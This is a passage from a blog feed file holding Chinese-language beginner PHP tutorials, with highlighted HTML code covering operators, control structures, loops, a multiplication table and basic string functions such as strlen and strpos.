variable">$y</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string">'&lt;br>'</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token punctuation">(</span><span class="token variable">$x</span><span class="token operator">*</span><span class="token variable">$y</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string">'&lt;br>'</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token punctuation">(</span><span class="token variable">$x</span><span class="token operator">/</span><span class="token variable">$y</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string">'&lt;br>'</span><span class="token punctuation">;</span><span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h5 id="字符串运算"><a href="#字符串运算" class="headerlink" title="字符串运算"></a>字符串运算</h5><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20201009115339493.png#pic_center" alt="在这里插入图片描述"></p><p>在PHP中字符串的拼接用.（点）来完成，例如：</p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token comment" spellcheck="true">//定义变量x，y并赋值</span><span class="token variable">$x</span> <span class="token operator">=</span> <span class="token string">'Hello'</span><span class="token punctuation">;</span><span class="token variable">$y</span> <span class="token operator">=</span> <span class="token string">' world!'</span><span class="token punctuation">;</span><span class="token variable">$z</span> <span class="token operator">=</span> <span class="token variable">$x</span><span class="token punctuation">.</span><span class="token variable">$y</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token variable">$z</span><span class="token punctuation">;</span><span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20201009120233411.png#pic_center" alt="在这里插入图片描述"></p><h5 id="赋值运算符"><a href="#赋值运算符" class="headerlink" title="赋值运算符"></a>赋值运算符</h5><p>示例：</p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token comment" spellcheck="true">//定义变量x，y并赋值</span><span class="token variable">$x</span> <span class="token operator">=</span> <span class="token number">10</span><span class="token punctuation">;</span><span class="token variable">$y</span> <span class="token operator">=</span> <span class="token number">20</span><span class="token punctuation">;</span><span class="token variable">$z</span> <span class="token operator">=</span> <span class="token number">5</span><span class="token punctuation">;</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token number">3</span><span class="token punctuation">;</span><span class="token variable">$b</span> <span class="token operator">=</span> <span class="token number">20</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//开始赋值运算</span><span class="token keyword">echo</span> <span class="token variable">$x</span><span class="token operator">+</span><span class="token operator">=</span><span class="token number">10</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string">'&lt;br>'</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token variable">$y</span><span class="token operator">-</span><span class="token operator">=</span><span class="token number">10</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string">'&lt;br>'</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token variable">$z</span><span class="token operator">*</span><span class="token operator">=</span><span class="token number">10</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string">'&lt;br>'</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token variable">$a</span><span class="token operator">/</span><span class="token operator">=</span><span class="token number">10</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string">'&lt;br>'</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token variable">$b</span><span class="token operator">%</span><span class="token operator">=</span><span class="token number">10</span><span class="token punctuation">;</span><span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h5 id="递增递减运算符"><a href="#递增递减运算符" class="headerlink" title="递增递减运算符"></a>递增递减运算符</h5><p>递增递减运算符只能作用于变量：<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20201010022732972.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTczNjc2,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>例子：</p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>    <span class="token variable">$x</span> <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>    <span class="token variable">$y</span> <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token variable">$x</span><span class="token operator">++</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token string">'&lt;br>'</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token operator">++</span><span class="token variable">$y</span><span class="token punctuation">;</span><span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这里输出的结果一个为一一个为二，但其实都是2，之不过一个先输出再自加，一个先自加再输出而已，有点类似于二进制里边的压栈出栈的感觉，顺序不同而已。</p><h5 id="比较运算符"><a href="#比较运算符" class="headerlink" title="比较运算符"></a>比较运算符</h5><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20201010143249680.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTczNjc2,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>这里强调说一下等于（==）和全等于（ ===）的区别：</p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>    <span class="token variable">$x</span> <span class="token operator">=</span> <span class="token number">123</span><span class="token punctuation">;</span>    <span class="token variable">$y</span> <span class="token operator">=</span> <span class="token string">'123'</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$x</span> <span class="token operator">==</span> <span class="token variable">$y</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token keyword">echo</span> <span class="token string">'$x dengyu $y'</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$x</span> <span class="token operator">===</span> <span class="token variable">$y</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token keyword">echo</span> <span class="token string">'$x quandengyu $y'</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>运行结果：<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20201010144307962.png#pic_center" alt="在这里插入图片描述"></p><p>可以看到，<strong>全等于不仅要求数值相同，数据结构也得一样</strong>，x是整型，y是字符串，所以不会输出结果</p><ol start="6"><li>三元运算符</li></ol><p>这个比较特殊，用到的是?和:，我们来一段代码看一下：</p><pre class="line-numbers language-php"><code class="language-php"><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>utf-8<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span><span class="token delimiter">&lt;?php</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token number">10</span><span class="token punctuation">;</span><span class="token variable">$b</span> <span class="token operator">=</span> <span class="token number">20</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//进行三元运算，a大于b吗？大于就输出大于，反之输出不大于</span><span class="token keyword">echo</span> <span class="token variable">$a</span><span class="token operator">></span><span class="token variable">$b</span><span class="token operator">?</span><span class="token string">'大于'</span><span class="token punctuation">:</span><span class="token string">'不大于'</span><span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>结果：<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20201031135638369.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTczNjc2,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><h5 id="逻辑运算符"><a href="#逻辑运算符" class="headerlink" title="逻辑运算符"></a>逻辑运算符</h5><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20201010151738772.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTczNjc2,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><p>来一段代码感受一下：</p><pre class="line-numbers language-php"><code class="language-php"><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>utf-8<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span><span class="token delimiter">&lt;?php</span>    <span class="token variable">$a</span> <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>    <span class="token variable">$b</span> <span class="token operator">=</span> False<span class="token punctuation">;</span>    <span class="token keyword">echo</span><span class="token string">'是$a 与 $b的结果'</span><span class="token punctuation">.</span><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token variable">$a</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$b</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token string">"&lt;br>"</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span><span class="token string">'是$a 或 $b的结果'</span><span class="token punctuation">.</span><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token variable">$a</span> <span class="token operator">||</span> <span class="token variable">$b</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token string">"&lt;br>"</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span><span class="token string">'是$a 异或 $b的结果'</span><span class="token punctuation">.</span><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token variable">$a</span> <span class="token keyword">xor</span> <span class="token variable">$b</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token string">"&lt;br>"</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span><span class="token string">'是 非$b的结果'</span><span class="token punctuation">.</span><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$b</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/202010311410281.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTczNjc2,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><h3 id="PHP中的控制结构"><a href="#PHP中的控制结构" class="headerlink" title="PHP中的控制结构"></a>PHP中的控制结构</h3><h5 id="选择结构（if、switch）"><a href="#选择结构（if、switch）" class="headerlink" title="选择结构（if、switch）"></a>选择结构（if、switch）</h5><p>这里的if-else跟其他编程语言的没啥区别，就是写法不同：</p><pre class="line-numbers language-php"><code class="language-php"><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>utf-8<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span><span class="token delimiter">&lt;?php</span>    <span class="token variable">$a</span> <span class="token operator">=</span> <span class="token number">10</span><span class="token punctuation">;</span>    <span class="token variable">$b</span> <span class="token operator">=</span> <span class="token number">20</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$a</span><span class="token operator">></span><span class="token number">5</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token keyword">echo</span> <span class="token string">'a>5'</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">elseif</span> <span class="token punctuation">(</span><span class="token variable">$a</span><span class="token operator">></span><span class="token number">1</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token keyword">echo</span> <span class="token string">"a>1"</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">else</span>    <span class="token punctuation">{</span>        <span class="token keyword">echo</span> <span class="token string">"不符合条件"</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>接着就是switch语句，switch后跟一个变量，case后跟条件，符合就break，不符合顺序执行下一条case，都不符合就执行default：</p><pre class="line-numbers language-php"><code class="language-php"><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>utf-8<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span><span class="token delimiter">&lt;?php</span>    <span class="token variable">$a</span> <span class="token operator">=</span> <span class="token number">10</span><span class="token punctuation">;</span>    <span class="token variable">$b</span> <span class="token operator">=</span> <span class="token number">20</span><span class="token punctuation">;</span>    <span class="token keyword">switch</span> <span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token keyword">case</span> <span class="token number">1</span><span class="token punctuation">:</span>            <span class="token keyword">echo</span> <span class="token string">"a = 1"</span><span class="token punctuation">;</span>            <span class="token keyword">break</span><span class="token punctuation">;</span>        <span class="token keyword">case</span> <span class="token number">2</span><span class="token punctuation">:</span>            <span class="token keyword">echo</span> <span class="token string">"a = 2"</span><span class="token punctuation">;</span>            <span class="token keyword">break</span><span class="token punctuation">;</span>        <span class="token keyword">case</span> <span class="token number">6</span><span class="token punctuation">:</span>            <span class="token keyword">echo</span> <span class="token string">"a = 6"</span><span class="token punctuation">;</span>                        <span class="token keyword">break</span><span class="token punctuation">;</span>        <span class="token keyword">default</span><span class="token punctuation">:</span>            <span class="token keyword">echo</span> <span class="token string">"a = ???"</span><span class="token punctuation">;</span>            <span class="token keyword">break</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h5 id="循环结构（while、for、do-while）"><a href="#循环结构（while、for、do-while）" class="headerlink" title="循环结构（while、for、do-while）"></a>循环结构（while、for、do-while）</h5><p>while后跟条件，中间是循环体，这是while在编程语言中的典型用法：</p><pre class="line-numbers language-php"><code class="language-php"><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>utf-8<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span><span class="token delimiter">&lt;?php</span>    <span class="token variable">$a</span> <span class="token operator">=</span> <span class="token number">10</span><span class="token punctuation">;</span>    <span class="token variable">$b</span> <span class="token operator">=</span> <span class="token number">20</span><span class="token punctuation">;</span>    <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token variable">$a</span><span class="token operator">&lt;</span><span class="token variable">$b</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token keyword">echo</span> <span class="token string">"a = $a,b = $b"</span><span class="token punctuation">.</span><span class="token string">'&lt;br>'</span><span class="token punctuation">;</span>        <span class="token variable">$a</span><span class="token operator">++</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>运行结果：<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20201031145233681.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTczNjc2,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>接着是for，这里的for循环跟C语言中的for循环有点相似，先定义一个初始变量i，跟上一个循环条件，最后做一个自变来防止死循环：</p><pre class="line-numbers language-php"><code class="language-php"><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>utf-8<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span><span class="token delimiter">&lt;?php</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token variable">$i</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$i</span> <span class="token operator">&lt;</span> <span class="token number">100</span><span class="token punctuation">;</span> <span class="token variable">$i</span><span class="token operator">+</span><span class="token operator">=</span><span class="token number">2</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>         <span class="token shell-comment comment"># code...</span>        <span class="token keyword">echo</span> <span class="token string">"i = $i"</span><span class="token punctuation">.</span><span class="token string">"&lt;br>"</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20201031150021104.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTczNjc2,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>最后是do-while，它跟while的区别就是，do-while是先执行语句，在判断循环，while则是先判断循环，在执行语句：</p><pre class="line-numbers language-php"><code class="language-php"><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>utf-8<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span><span class="token delimiter">&lt;?php</span>    <span class="token variable">$a</span> <span class="token operator">=</span> <span class="token number">15</span><span class="token punctuation">;</span>    <span class="token variable">$b</span> <span class="token operator">=</span> <span class="token number">10</span><span class="token punctuation">;</span>    <span class="token keyword">do</span>    <span class="token punctuation">{</span>        <span class="token keyword">echo</span> <span class="token string">"a =$a"</span><span class="token punctuation">.</span><span class="token string">'&lt;br>'</span><span class="token punctuation">;</span>        <span class="token variable">$a</span><span class="token operator">--</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span> <span class="token keyword">while</span> <span class="token punctuation">(</span> <span class="token variable">$a</span><span class="token operator">></span><span class="token variable">$b</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20201031151223496.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTczNjc2,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><h3 id="输出九九乘法表"><a href="#输出九九乘法表" class="headerlink" title="输出九九乘法表"></a>输出九九乘法表</h3><p>重点在于两个for循环的嵌套，i必须小于10，并且自加，j必须小于等于i，也进行自加，且它俩初始值都为0</p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token variable">$i</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$i</span> <span class="token operator">&lt;</span><span class="token number">10</span> <span class="token punctuation">;</span> <span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>     <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token variable">$j</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$j</span> <span class="token operator">&lt;=</span><span class="token variable">$i</span> <span class="token punctuation">;</span> <span class="token variable">$j</span><span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>         <span class="token keyword">echo</span> <span class="token string">"$i*$j="</span><span class="token punctuation">.</span><span class="token punctuation">(</span><span class="token variable">$i</span><span class="token operator">*</span><span class="token variable">$j</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token string">'&amp;nbsp'</span><span class="token punctuation">.</span><span class="token string">'&amp;nbsp'</span><span class="token punctuation">.</span><span class="token string">'&amp;nbsp'</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">echo</span> <span class="token string">"&lt;br/>"</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>运行结果：<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20201101234526611.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTczNjc2,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> PHP开发基础篇 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PHP </tag>
            
            <tag> 编程 </tag>
            
            <tag> 安全开发 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>详解PHP中的字符串</title>
      <link href="/posts/99ca94c.html"/>
      <url>/posts/99ca94c.html</url>
      
        <content type="html"><![CDATA[<h3 id="字符串"><a href="#字符串" class="headerlink" title="字符串"></a>字符串</h3><h5 id="单引号与双引号的区别"><a href="#单引号与双引号的区别" class="headerlink" title="单引号与双引号的区别"></a>单引号与双引号的区别</h5><p>单引号中的变量不会被解析且格式化字符串不会被转义，而双引号中的变量会被解析，格式化字符串也会被转义：</p><pre class="line-numbers language-php"><code class="language-php"><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>utf-8<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span><span class="token delimiter">&lt;?php</span>    <span class="token variable">$a</span> <span class="token operator">=</span> <span class="token number">15</span><span class="token punctuation">;</span>    <span class="token variable">$b</span> <span class="token operator">=</span> <span class="token number">10</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token string">"xxxx\nxxx$a"</span><span class="token punctuation">.</span><span class="token string">'&lt;br>'</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token string">'xx\nxxxxx$a'</span><span class="token punctuation">.</span><span class="token string">'&lt;br>'</span><span class="token punctuation">;</span><span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>运行结果：<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/20201031153141755.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTczNjc2,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><h3 id="字符串常用的函数"><a href="#字符串常用的函数" class="headerlink" title="字符串常用的函数"></a>字符串常用的函数</h3><h5 id="strlen"><a href="#strlen" class="headerlink" title="strlen()"></a>strlen()</h5><p>输出当前字符串的长度，汉字占3个字符，英文和数字占1个字符：</p><pre class="line-numbers language-php"><code class="language-php"><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>utf-8<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span><span class="token delimiter">&lt;?php</span>    <span class="token variable">$a</span> <span class="token operator">=</span> <span class="token string">"editor.csdn.com"</span><span class="token punctuation">;</span>    <span class="token shell-comment comment"># 这里输出15</span>    <span class="token keyword">echo</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h5 id="mb-strlen"><a href="#mb-strlen" class="headerlink" title="mb_strlen()"></a>mb_strlen()</h5><p>输出解码后字符串的长度：</p><pre class="line-numbers language-php"><code class="language-php"><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>utf-8<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span><span class="token delimiter">&lt;?php</span>    <span class="token variable">$a</span> <span class="token operator">=</span> <span class="token string">"editor.csdn.com"</span><span class="token punctuation">;</span>    <span class="token variable">$b</span> <span class="token operator">=</span> <span class="token string">'北京'</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token function">mb_strlen</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">,</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token string">"&lt;br>"</span><span class="token punctuation">;</span>    <span class="token shell-comment comment"># 北京经过utf-8解码后是2</span>    <span class="token keyword">echo</span> <span class="token function">mb_strlen</span><span class="token punctuation">(</span><span class="token variable">$b</span><span class="token punctuation">,</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h5 id="strpos"><a href="#strpos" class="headerlink" title="strpos()"></a>strpos()</h5><p>这个函数用来返回字符串在其当前行数出现的位置：</p><pre class="line-numbers language-php"><code class="language-php"><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>utf-8<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span><span class="token delimiter">&lt;?php</span>    <span class="token variable">$a</span> <span class="token operator">=</span> <span class="token string">"editor.csdn.com"</span><span class="token punctuation">;</span>    <span class="token variable">$b</span> <span class="token operator">=</span> <span class="token string">'北京'</span><span class="token punctuation">;</span>    <span class="token shell-comment comment"># 这里会输出7</span>    <span class="token keyword">echo</span> <span class="token function">strpos</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">,</span> <span class="token string">'csdn'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token 